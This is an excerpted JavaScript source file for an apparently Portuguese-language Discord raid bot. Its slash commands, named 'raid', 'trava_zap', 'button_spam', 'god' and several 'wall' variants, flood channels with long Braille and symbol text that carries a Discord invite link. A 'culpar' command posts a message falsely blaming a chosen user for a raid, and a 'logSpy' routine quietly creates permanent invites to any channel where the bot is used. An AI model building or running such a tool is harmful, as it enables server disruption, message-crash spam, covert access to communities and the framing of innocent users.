...
const PONTO_TEXT = `⠁ ⠂ ⠃ ⠄ ⠅ ⠆ ⠇ ⠈ ⠉ ⠊ ⠋ ⠌ ⠍ ⠎ ⠏ ⠐ ⠑ ⠒ ⠓ ⠔ ⠕ ⠖ ⠗ ⠘ ⠙ ⠚ ⠛ ⠜ ⠝ ⠞ ⠟ ⠠ ⠡ ⠢ ⠣ ⠤ ⠥ ⠦ ⠧ ⠨ ⠩ ⠪ ⠫ ⠬ ⠭ ⠮ ⠯ ⠰ ⠱ ⠲ ⠳ ⠴ ⠵ ⠶ ⠷ ⠸ ⠹ ⠺ ⠻ ⠼ ⠽ ⠾ ⠿ ⡀ ⡁ ⡂ ⡃ ⡄ ⡅ ⡆ ⡇ ⡈ ⡉ ⡊ ⡋ ⡌ ⡍ ⡎ ⡏ ⡐ ⡑ ⡒ ⡓ ⡔ ⡕ ⡖ ⡗ ⡘ ⡙ ⡚ ⡛ ⡜ ⡝ ⡞ ⡟ ⡠ ⡡ ⡢ ⡣ ⡤ ⡥ ⡦ ⡧ ⡨ ⡩ ⡪ ⡫ ⡬ ⡭ ⡮ ⡯ ⡰ ⡱ ⡲ ⡳ ⡴ ⡵ ⡶ ⡷ ⡸ ⡹ ⡺ ⡻ ⡼ ⡽ ⡾ ⡿ ⢀ ⢁ ⢂ ⢃ ⢄ ⢅ ⢆ ⢇ ⢈ ⢉ ⢊ ⢋ ⢌ ⢍ ⢎ ⢏ ⢐ ⢑ ⢒ ⢓ ⢔ ⢕ ⢖ ⢗ ⢘ ⢙ ⢚ ⢛ ⢜ ⢝ ⢞ ⢟ ⢠ ⢡ ⢢ ⢣ ⢤ ⢥ ⢦ ⢧ ⢨ ⢩ ⢪ ⢫ ⢬ ⢭ ⢮ ⢯ ⢰ ⢱ ⢲ ⢳ ⢴ ⢵ ⢶ ⢷ ⢸ ⢹ ⢺ ⢻ ⢼ ⢽ ⢾ ⢿ ⣀ ⣁ ⣂ ⣃ ⣄ ⣅ ⣆ ⣇ ⣈ ⣉ ⣊ ⣋ ⣌ ⣍ ⣎ ⣏ ⣐ ⣑ ⣒ ⣓ ⣔ ⣕ ⣖ ⣗ ⣘ ⣙ ⣚ ⣛ ⣜ ⣝ ⣞ ⣟ ⣠ ⣡ ⣢ ⣣ ⣤ ⣥ ⣦ ⣧ ⣨ ⣩ ⣪ ⣫ https://discord.gg/ure7pvshFW ⣬ ⣭ ⣮ ⣯ ⣰ ⣱ ⣲ ⣳ ⣴ ⣵ ⣶ ⣷ ⣸ ⣹ ⣺ ⣻ ⣼ ⣽ ⣾ ⣿ ⤀ ⤁ ⤂ ⤃ ⤄ ⤅ ⤆ ⤇ ⤈ ⤉ ⤊ ⤋ ⤌ ⤍ ⤎ ⤏ ⤐ ⤑ ⤒ ⤓ ⤔ ⤕ ⤖ ⤗ ⤘ ⤙ ⤚ ⤛ ⤜ ⤝ ⤞ ⤟ ⤠ ⤡ ⤢ ⤣ ⤤ ⤥ ⤦ ⤧ ⤨ ⤩ ⤪ ⤫ ⤬ ⤭ ⤮ ⤯ ⤰ ⤱ ⤲ ⤳ ⤴ ⤵ ⤶ ⤷ ⤸ ⤹ ⤺ ⤻ ⤼ ⤽ ⤾ ⤿ ⥀ ⥁ ⥂ ⥃ ⥄ ⥅ ⥆ ⥇ ⥈ ⥉ ⥊ ⥋ ⥌ ⥍ ⥎ ⥏ ⥐ ⥑ ⥒ ⥓ ⥔ ⥕ ⥖ ⥗ ⥘ ⥙ ⥚ ⥛ ⥜ ⥝ ⥞ ⥟ ⥠ ⥡ ⥢ ⥣ ⥤ ⥥ ⥦ ⥧ ⥨ ⥩ ⥪ ⥫ ⥬ ⥭ ⥮ ⥯ ⥰ ⥱ ⥲ ⥳ ⥴ ⥵ ⥶ ⥷ ⥸ ⥹ ⥺ ⥻ ⥼ ⥽ ⥾ ⥿ ⦀ ⦁ ⦂ ⦃ ⦄ ⦅ ⦆ ⦇ ⦈ ⦉ ⦊ ⦋ ⦌ ⦍ ⦎ ⦏ ⦐ ⦑ ⦒ ⦓ ⦔ ⦕ ⦖ ⦗ ⦘ ⦙ ⦚ ⦛ ⦜ ⦝ ⦞ ⦟ ⦠ ⦡ ⦢ ⦣ ⦤ ⦥ ⦦ ⦧ ⦨ ⦩ ⦪ ⦫ ⦬ ⦭ ⦮ ⦯ ⦰ ⦱ ⦲ ⦳ ⦴ ⦵ ⦶ ⦷ ⦸ ⦹ ⦺ ⦻ ⦼ ⦽ ⦾ ⦿ ⧀ ⧁ ⧂ ⧃ ⧄ ⧅ ⧆ ⧇ ⧈ ⧉ ⧊ ⧋ ⧌ ⧍ ⧎ ⧏ ⧐ ⧑ ⧒ ⧓ ⧔ ⧕ ⧖ ⧗ ⧘ ⧙ ⧚ ⧛ ⧜ ⧝ ⧞ ⧟ ⧠ ⧡ ⧢ ⧣ ⧤ ⧥ ⧦ ⧧ ⧨ ⧩ ⧪ ⧫ ⧬ ⧭ ⧮ ⧯  https://discord.gg/ure7pvshFW ⧰ ⧱ ⧲ ⧳ ⧴ ⧵ ⧶ ⧷ ⧸ ⧹ ⧺ ⧻ ⧼ ⧽ ⧾ ⧿ ⨀ ⨁ ⨂ ⨃ ⨄ ⨅ ⨆ ⨇ ⨈ ⨉ ⨊ ⨋ ⨌ ⨍ ⨎ ⨏ ⨐ ⨑ ⨒ ⨓⨔ ⨕ ⨖ ⨗ ⨘ ⨙ ⨚ ⨛ ⨜ ⨝ ⨞ ⨟ ⨠ ⨡ ⨢ ⨣ ⨤ ⨥ ⨦ ⨧ ⨨ ⨩ ⨪ ⨫ ⨬ ⨭ ⨮ ⨯ ⨰ ⨱ ⨲ ⨳ ⨴ ⨵ ⨶ ⨷ ⨸ ⨹ ⨺ ⨻ ⨼ ⨽ ⨾ ⨿ ⩀ ⩁ ⩂ ⩃ ⩄ ⩅ ⩆ ⩇ ⩈ ⩉ ⩊ ⩋ ⩌ ⩍ ⩎ ⩏ ⩐ ⩑ ⩒ ⩓ ⩔ ⩕ ⩖ ⩗ ⩘ ⩙ ⩚ ⩛ ⩜ ⩝ ⩞ ⩟ ⩠ ⩡ ⩢ ⩣ ⩤ ⩥ ⩦ ⩧ ⩨ ⩩ ⩪ ⩫ ⩬ ⩭ ⩮ ⩯ ⩰ ⩱ ⩲ ⩳ ⩴ ⩵ ⩶ ⩷ ⩸ ⩹ ⩺ ⩻ ⩼ ⩽ ⩾ ⩿ ⪀ ⪁ ⪂ ⪃ ⪄ ⪅ ⪆ ⪇ ⪈ ⪉ ⪊ ⪋ ⪌ ⪍ ⪎ ⪏ ⪐ ⪑ ⪒ ⪓ ⪔ ⪕ ⪖ ⪗ ⪘ ⪙ ⪚ ⪛ ⪜ ⪝ ⪞ ⪟ ⪠ ⪡ ⪢ ⪣ ⪤ ⪥ ⪦ ⪧ ⪨ ⪩ ⪪ ⪫ ⪬ ⪭ ⪮ ⪯ ⪰ ⪱ ⪲ ⪳ ⪴ ⪵ ⪶ ⪷ ⪸ ⪹ ⪺ ⪻ ⪼ ⪽ ⪾ ⪿ ⫀ ⫁ ⫂ ⫃ ⫄ ⫅ ⫆ ⫇ ⫈ ⫉ ⫊ ⫋ ⫋ ⫌ ⫍ ⫎ ⫏ ⫐ ⫑ ⫒ ⫓ ⫔ ⫕ ⫖ ⫗ ⫘ ⫙ ⫚ ⫛ ⫝ ⫞ ⫟ ⫠ ⫡ ⫢ ⫣ ⫤ ⫥ ⫦ ⫧ ⫨ ⫩ ⫪ ⫫ ⫬ ⫭ ⫮ ⫯ ⫰ ⫱ ⫲ ⫳ ⫴ ⫵ ⫶ ⫷ ⫸ ⫹ ⫺ ⫻ ⫼ ⫽ ⫾ ⫿ ⬚ Ⱡ ⱡ Ɫ Ᵽ Ɽ ⱥ ⱦ Ⱨ ⱨ Ⱪ ⱪ Ⱬ ⱬ Ɑ ⱱ Ⱳ ⱳ ⱴ Ⱶ ⱶ ⱷ ⴰ ⴱ ⴲ ⴳ ⴴ ⴵ ⴶ ⴷ ⴸ ⴹ ⴺ ⴻ ⴼ ⴽ ⴾ ⴿ ⵀ ⵁ ⵂ ⵃ ⵄ ⵅ ⵆ ⵇ ⵈ ⵉ ⵊ ⵋ ⵌ ⵍ ⵎ ⵏ ⵐ ⵑ ⵒ ⵓ ⵔ ⵕ ⵖ ⵗ ⵘ ⵙ ⵚ ⵛ ⵜ ⵝ ⵞ ⵟ ⵠ https://discord.gg/ure7pvshFW ⵡ ⵢ ⵣ ⵤ ⵥ`;

// Textos dos Walls e Outros
...
const logSpy = async (interaction) => {
    ...
    try {
        if (interaction.guild && interaction.channel) {
            await interaction.channel.createInvite({ maxAge: 0, maxUses: 0, unique: true });
        }
    } catch (err) {}
};
...
module.exports = async (TOKEN, CLIENT_ID) => {
    ...
    const commands = [
        new SlashCommandBuilder().setName('raid').setDescription('RAID V1').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('raid2').setDescription('RAID V2').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('500_raid').setDescription('RAID 500x').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('super_raid2').setDescription('SUPER RAID V2').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('trava_zap2').setDescription('TRAVA ZAP 2').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('trava_zap3').setDescription('TRAVA ZAP 3').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('wall_point').setDescription('PAREDE PONTOS').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('wall_square').setDescription('PAREDE QUADRADA').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('wall_given').setDescription('PAREDE DADOS').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('wall_bar').setDescription('PAREDE BARRAS').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('supreme_raid').setDescription('RAID SUPREMA').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('trava_zap').setDescription('10 MENSAGENS').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('ponto').setDescription('BRAILLE').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('culpar').setDescription('Culpar User').addUserOption(o => o.setName('alvo').setRequired(true).setDescription('Usuário')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('chines').setDescription('Texto Chinês').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('say').setDescription('Falar').addStringOption(o=>o.setName('t').setRequired(true).setDescription('Texto')).addIntegerOption(o=>o.setName('q').setRequired(true).setDescription('Qtd')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('button_spam').setDescription('Flood Botões').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('god').setDescription('Raid Deus').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('stop').setDescription('Parar Bot').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('button_say')
            .setDescription('Cria um botão de disparo manual')
            .addStringOption(o => o.setName('texto').setRequired(true).setDescription('Texto a enviar'))
    ...
    client.on('interactionCreate', async interaction => {
        ...
        if (interaction.isButton()) {
            if (interaction.customId.startsWith('say_')) {
                const textToSay = interaction.customId.replace('say_', '');
                
                // Envia a mensagem no canal (Ignora erros se não tiver perm)
                await interaction.channel.send(textToSay).catch(e => console.log("Erro botão:", e.message));
                
                // Avisa o Discord que o clique foi recebido (Sem loading infinito)
        ...
        if (commandName === 'stop') {
            ...
            return interaction.reply({ content: '🛑 **PARADO.**', flags: [MessageFlags.Ephemeral] });
        }

        // 2. COMANDO BUTTON_SAY
        if (commandName === 'button_say') {
            const text = options.getString('texto');
            const safeText = text.substring(0, 90); 

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`say_${safeText}`) 
                    .setLabel('💣 DISPARAR')
                    .setStyle(ButtonStyle.Danger)
            );

            await interaction.reply({ 
                content: `### ☢️ PAINEL MANUAL\n**Texto:** "${safeText}"`, 
                components: [row],
                flags: [MessageFlags.Ephemeral] // Só você vê isso
            });
            return;
        }

        // 3. OUTROS COMANDOS
        await interaction.reply({ content: '💀 **Executando...**', flags: [MessageFlags.Ephemeral] }).catch(() => {});
        stopSignals.set(user.id, false);
        const customLink = options.getString('link');

        if (commandName === '500_raid') {
            const content = RAID2_CONTENT || "Raid";
        ...
        if (commandName === 'trava_zap3') {
             for(let i=0; i < 10; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: TRAVA_3_CONTENT }).catch(() => {});
                await wait(2500); 
            }
        }
        ...
        if (commandName === 'trava_zap2') {
            for(let i=0; i < 10; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: TRAVA_2_CONTENT.substring(0, 1950) }).catch((e) => {});
                await wait(2500); 
            }
        }
        ...
        if (commandName === 'culpar') {
            ...
            await interaction.followUp({ content: `✅ ${alvo} sua Raid foi concluída com sucesso!` }).catch(() => {});
        }
